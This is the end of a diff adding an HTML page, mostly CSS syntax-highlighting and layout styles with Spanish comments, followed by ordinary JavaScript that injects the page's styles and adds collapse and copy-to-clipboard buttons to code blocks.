+/* Literal.Number.Bin */
+.highlight .mf {color: #666;}
+
+/* Literal.Number.Float */
+.highlight .mh {color: #666;}
+
+/* Literal.Number.Hex */
+.highlight .mi {color: #666;}
+
+/* Literal.Number.Integer */
+.highlight .mo {color: #666;}
+
+/* Literal.Number.Oct */
+.highlight .sa {color: #BA2121;}
+
+/* Literal.String.Affix */
+.highlight .sb {color: #BA2121;}
+
+/* Literal.String.Backtick */
+.highlight .sc {color: #BA2121;}
+
+/* Literal.String.Char */
+.highlight .dl {color: #BA2121;}
+
+/* Literal.String.Delimiter */
+.highlight .sd {color: #BA2121; font-style: italic;}
+
+/* Literal.String.Doc */
+.highlight .s2 {color: #BA2121;}
+
+/* Literal.String.Double */
+.highlight .se {color: #AA5D1F; font-weight: bold;}
+
+/* Literal.String.Escape */
+.highlight .sh {color: #BA2121;}
+
+/* Literal.String.Heredoc */
+.highlight .si {color: #A45A77; font-weight: bold;}
+
+/* Literal.String.Interpol */
+.highlight .sx {color: #008000;}
+
+/* Literal.String.Other */
+.highlight .sr {color: #A45A77;}
+
+/* Literal.String.Regex */
+.highlight .s1 {color: #BA2121;}
+
+/* Literal.String.Single */
+.highlight .ss {color: #19177C;}
+
+/* Literal.String.Symbol */
+.highlight .bp {color: #008000;}
+
+/* Name.Builtin.Pseudo */
+.highlight .fm {color: #00F;}
+
+/* Name.Function.Magic */
+.highlight .vc {color: #19177C;}
+
+/* Name.Variable.Class */
+.highlight .vg {color: #19177C;}
+
+/* Name.Variable.Global */
+.highlight .vi {color: #19177C;}
+
+/* Name.Variable.Instance */
+.highlight .vm {color: #19177C;}
+
+/* Name.Variable.Magic */
+.highlight .il {color: #666;}
+
+body {font-family: Arial, sans-serif; line-height: 1.6; margin: 0 auto; padding: 20px;}
+
+#main-title-block {background-color: #2e2e2e; color: #f0f0f0; padding: 18px; border-radius: 10px; border: 1px solid #444; box-shadow: 0 2px 5px rgba(0,0,0,0.2); font-size: 1.8em; font-weight: bold; margin-bottom: 20px; text-align: center;}
+
+pre:not(.highlight pre) {background-color: #fef6e4; color: #2e2e2e; padding: 12px; border-radius: 5px; overflow-x: auto; border: 1px solid #f0e6d4; box-shadow: 0 1px 3px rgba(0,0,0,0.1); margin: 15px 0;}
+
+code {font-family: "Courier New", Courier, monospace;}
+
+.highlight pre {background: none; border: none; box-shadow: none; padding: 12px; margin: 0; border-radius: 0;}
+
+.highlight .c1 {color: #9a8052 !important; font-style: italic;}
+
+.highlight .cm {color: #9a8052 !important; font-style: italic;}
+
+.highlight .k {color: #8250df !important; font-weight: normal;}
+
+.highlight .kd {color: #8250df !important; font-weight: normal;}
+
+.highlight .kn {color: #8250df !important; font-weight: normal;}
+
+.highlight .s {color: #327d41 !important;}
+
+.highlight .s1 {color: #327d41 !important;}
+
+.highlight .s2 {color: #327d41 !important;}
+
+.highlight .sb {color: #327d41 !important;}
+
+.highlight .si {color: #327d41 !important;}
+
+.highlight .m {color: #606060 !important;}
+
+.highlight .mi {color: #606060 !important;}
+
+.highlight .mf {color: #606060 !important;}
+
+.highlight .o {color: #666666 !important; font-weight: normal;}
+
+.highlight .ow {color: #666666 !important; font-weight: normal;}
+
+.highlight .kc {color: #9a5b13 !important;}
+
+.highlight .no {color: #9a5b13 !important;}
+
+.highlight .nf {color: #606060 !important; font-weight: normal;}
+
+.highlight .nb {color: #606060 !important; font-weight: normal;}
+
+.highlight .nx {color: #606060 !important; font-weight: normal;}
+
+.highlight .p {color: #666666 !important; font-weight: normal;}
+
+.language-jsx .highlight .k {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-jsx .highlight .kd {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-jsx .highlight .kr {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-jsx .highlight .nx {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .nf {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .nt {color: #116329 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-jsx .highlight .nc {color: #116329 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-jsx .highlight .o {color: #666666 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-jsx .highlight .p {color: #666666 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-jsx .highlight .na {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .s {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .s1 {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .s2 {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .c {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-jsx .highlight .c1 {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-jsx .highlight .cm {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-jsx .highlight .m {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .mi {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-jsx .highlight .mf {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-react .highlight .k {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-react .highlight .kd {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-react .highlight .kr {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-react .highlight .nx {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-react .highlight .nf {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-react .highlight .nt {color: #116329 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-react .highlight .nc {color: #116329 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-react .highlight .o {color: #666666 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-react .highlight .p {color: #666666 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-react .highlight .na {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-react .highlight .s {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-react .highlight .s1 {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-react .highlight .s2 {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-react .highlight .c {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-react .highlight .c1 {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-react .highlight .cm {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-react .highlight .m {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-react .highlight .mi {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-react .highlight .mf {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .k {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-tsx .highlight .kd {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-tsx .highlight .kr {color: #af00db !important; font-weight: normal; background: none !important; border: none !important;}
+
+.language-tsx .highlight .nx {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .nf {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .nt {color: #116329 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-tsx .highlight .nc {color: #116329 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-tsx .highlight .o {color: #666666 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-tsx .highlight .p {color: #666666 !important; background: none !important; border: none !important; box-shadow: none !important; outline: none !important;}
+
+.language-tsx .highlight .na {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .s {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .s1 {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .s2 {color: #0a3069 !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .c {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-tsx .highlight .c1 {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-tsx .highlight .cm {color: #656d76 !important; font-style: italic; background: none !important; border: none !important;}
+
+.language-tsx .highlight .m {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .mi {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .mf {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-tsx .highlight .kt {color: #0969da !important; background: none !important; border: none !important;}
+
+.language-javascript .highlight .err {color: #116329 !important; background: none !important; border: none !important;}
+
+.language-js .highlight .err {color: #116329 !important; background: none !important; border: none !important;}
+
+.highlight span {background: none !important; border: none !important; box-shadow: none !important; text-decoration: none !important; outline: none !important;}
+
+.svg-container {margin: 15px 0; text-align: center; padding: 10px;}
+
+.svg-container svg {max-width: 100%; height: auto;}
+
+.mermaid {margin: 15px 0; text-align: center;}
+
+.mermaid svg {max-width: 100%; height: auto;}
+
+.empty-code-block {background-color: #fef6e4; color: #2e2e2e; padding: 12px; border-radius: 5px; margin: 15px 0; font-family: monospace; border: 1px solid #f0e6d4; box-shadow: 0 1px 3px rgba(0,0,0,0.1);}
+
+.highlight-error {background-color: #fef6e4; color: #000080; padding: 12px; border-radius: 5px; margin: 15px 0; font-family: monospace; border: 1px solid #f0e6d4; box-shadow: 0 1px 3px rgba(0,0,0,0.1);}
+
+img {max-width: 100%; height: auto;}
+
+table {border-collapse: collapse; width: 100%;}
+
+th {border: 1px solid #ddd; padding: 8px; background-color: #f2f2f2;}
+
+td {border: 1px solid #ddd; padding: 8px;}
+
+.chapter-container {background-color: #f9f9f9; border: 1px solid #ddd; border-radius: 8px; padding: 15px; margin: 20px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1);}
+
+.chapter-container h2 {margin-top: 0; border-bottom: 1px solid #eee; padding-bottom: 10px; color: #444;}
+
+/* Estilos para el contenedor colapsable */
+.collapsible-container {position: relative; overflow: hidden; transition: max-height 0.3s ease; border-radius: 8px; margin: 0;}
+
+.collapsible-container pre {margin: 0; line-height: 1.4;}
+
+.collapsible-container .toggle-button {position: absolute; top: 8px; right: 8px; background: rgba(255,255,255,0.9); border: 1px solid #ccc; cursor: pointer; font-size: 16px; line-height: 1; padding: 4px 8px; border-radius: 4px; z-index: 10; box-shadow: 0 2px 4px rgba(0,0,0,0.1);}
+
+.collapsible-container .toggle-button:hover {background: rgba(255,255,255,1);}
+
+/* Estilos para el botón de copiar */
+.collapsible-container .copy-button {position: absolute; top: 8px; width: 24px; display: flex; /* Usamos flexbox para centrar el icono/texto */
+  align-items: center; justify-content: center; right: 48px; /* A 40 px a la izquierda del botón de colapsar */
+  background: rgba(255,255,255,0.9); border: 1px solid #ccc; cursor: pointer; font-size: 16px; line-height: 1; padding: 4px 8px; border-radius: 4px; z-index: 10; box-shadow: 0 2px 4px rgba(0,0,0,0.1);}
+
+.collapsible-container .copy-button:hover {background: rgba(255,255,255,1);}
+
+.collapsible-container .fade-overlay {position: absolute; bottom: -1px; left: 0; right: 0; height: 42px; background: linear-gradient(
+    to bottom, 
+    rgba(255,249,229,0), 
+    rgba(255,249,229,1)
+  ); pointer-events: none; z-index: 5; border-bottom-left-radius: 8px; border-bottom-right-radius: 8px;}
+
+.collapsible-container .ellipsis {position: absolute; bottom: 8px; width: 100%; text-align: center; color: #888; font-size: 18px; font-weight: bold; z-index: 6;}
+
+.collapsible-container.expanded .fade-overlay {display: none;}
+
+.collapsible-container.expanded .ellipsis {display: none;}
+
+/* Estilos para la tabla de contenidos */
+
+/* Contenedor principal */
+#table-of-contents {background-color: #f0f0ff; border-radius: 8px; padding: 20px 30px; margin: 20px 0; box-shadow: 0 2px 5px rgba(0, 0, 0, 0.05); font-family: Arial, sans-serif; border: 1px solid #d0d0ff;}
+
+/* Título de la tabla de contenidos */
+#contents-header {text-align: center; color: #585b9e; font-size: 24px; margin-top: 10px; margin-bottom: 20px; font-weight: 500; padding-bottom: 15px;}
+
+/* Listas */
+ul.toc {list-style-type: none; padding-left: 20px; margin: 0;}
+
+/* Elementos de la lista */
+li.toc {margin: 10px 0; line-height: 1.5; color: #585b9e;}
+
+/* Enlaces */
+a.toc {text-decoration: none; color: #585b9e; transition: color 0.2s, padding-left 0.2s; display: inline-block;}
+
+/* Efecto hover en los enlaces */
+a.toc:hover {color: #3333cc; padding-left: 3px; font-weight: 500; text-decoration: none;}
+
+/* Diferentes niveles de indentación */
+li.toc li.toc {margin-left: 15px;}
+
+li.toc li.toc li.toc {margin-left: 25px;}
+
+/* Hacer que los enlaces de primer nivel tengan un poco más de peso */
+ul.toc &gt; li.toc &gt; a.toc {font-weight: 500;}
+
+/* Línea decorativa sobre la tabla de contenidos */
+#table-of-contents:before {content: ""; display: block; height: 0px; background-color: #d0d0ff; margin-bottom: 15px;}</textarea>
+  <script>
+   document.addEventListener('DOMContentLoaded', function() {
+    var cssEditor = document.getElementById('css-editor');
+    if (cssEditor) {
+        var cssCode = cssEditor.value;
+        var style = document.createElement('style');
+        style.textContent = cssCode;
+        document.head.appendChild(style);
+        
+        // Aplicar estilo con retraso de 100ms para superar posibles hojas de estilo heredadas
+        setTimeout(function() {
+            document.querySelectorAll('.toggle-button').forEach(btn => {
+                btn.style.setProperty('color', 'black', 'important');
+                if (!btn.textContent.trim()) {
+                    btn.textContent = '+';
+                }
+            });
+            document.querySelectorAll('.copy-button').forEach(btn => {
+                btn.style.setProperty('color', 'black', 'important');
+            });
+        }, 1000);
+    }
+});
+  </script>
+  <script>
+   document.addEventListener('DOMContentLoaded', function() {
+(function() {
+  function initCollapsibles() {
+    // Esperar un poco para que los estilos se apliquen
+    setTimeout(() => {
+      document.querySelectorAll('.collapsible-container').forEach(container => {
+        const pre = container.querySelector('pre');
+        if (!pre) return;
+        
+        const maxLines = parseInt(container.dataset.maxLines, 10) || 6;
+        
+        // Crear un elemento temporal para medir line-height
+        const tempSpan = document.createElement('span');
+        tempSpan.style.visibility = 'hidden';
+        tempSpan.style.position = 'absolute';
+        tempSpan.style.fontSize = getComputedStyle(pre).fontSize;
+        tempSpan.style.fontFamily = getComputedStyle(pre).fontFamily;
+        tempSpan.style.lineHeight = '1.4';
+        tempSpan.textContent = 'M';
+        document.body.appendChild(tempSpan);
+        
+        const lineHeight = tempSpan.offsetHeight;
+        document.body.removeChild(tempSpan);
+        
+        const fullHeight = pre.scrollHeight;
+        const collapsedHeight = Math.ceil(lineHeight * maxLines);
+        
+        console.log('Debug:', {
+          maxLines,
+          lineHeight,
+          fullHeight,
+          collapsedHeight,
+          shouldCollapse: fullHeight > collapsedHeight + 10
+        });
+        
+        // Solo colapsar si realmente es necesario
+        if (fullHeight <= collapsedHeight + 10) {
+          return;
+        }
+
+        // Estado inicial: colapsado
+        container.style.maxHeight = collapsedHeight + 'px';
+        container.classList.add('collapsed');
+
+         // === Aquí agregamos primero el botón de "copiar" ===
+        const copyBtn = document.createElement('button');
+        copyBtn.className = 'copy-button';
+        copyBtn.innerHTML = '📋';
+        copyBtn.title = 'Copiar código';
+        container.appendChild(copyBtn);
+
+        // Evento para copiar el texto del <pre> al portapapeles
+        copyBtn.addEventListener('click', (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          // Copiar el contenido de 'pre'
+          const codeText = pre.innerText;
+          navigator.clipboard.writeText(codeText).then(() => {
+            // Opcional: retroalimentación breve (por ejemplo cambiar texto o color)
+            copyBtn.textContent = '✔';
+            setTimeout(() => { copyBtn.innerHTML = '📋'; }, 1000);
+          }).catch(err => {
+            console.error('Error al copiar al portapapeles:', err);
+          });
+        });
+
+        // Crear botón
+        const btn = document.createElement('button');
+        btn.className = 'toggle-button';
+        btn.textContent = '+';
+        btn.title = 'Expandir/Colapsar código';
+        container.appendChild(btn);
+
+        // Crear overlay y ellipsis
+        const overlay = document.createElement('div');
+        overlay.className = 'fade-overlay';
+        container.appendChild(overlay);
+        
+        const ell = document.createElement('div');
+        ell.className = 'ellipsis';
+        ell.textContent = '...';
+        container.appendChild(ell);
+
+        // Evento toggle
+        btn.addEventListener('click', (e) => {
+          e.preventDefault();
+          e.stopPropagation();
+          
+          const isCollapsed = container.classList.contains('collapsed');
+          
+          if (isCollapsed) {
+            // Expandir
+            container.style.maxHeight = fullHeight + 20 + 'px';
+            container.classList.remove('collapsed');
+            container.classList.add('expanded');
+            btn.textContent = '−';
+          } else {
+            // Colapsar
+            container.style.maxHeight = collapsedHeight + 'px';
+            container.classList.add('collapsed');
+            container.classList.remove('expanded');
+            btn.textContent = '+';
+          }
+        });
+      });
+    }, 100); // Esperar 100ms para que se apliquen los estilos
+  }
+  
+  // Múltiples puntos de inicialización para mayor compatibilidad
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', initCollapsibles);
+  } else {
+    initCollapsibles();
+  }
+  
+  // También inicializar en window.load por si acaso
+  window.addEventListener('load', initCollapsibles);
+})();
+});
+  </script>
+ </body>
+</html>
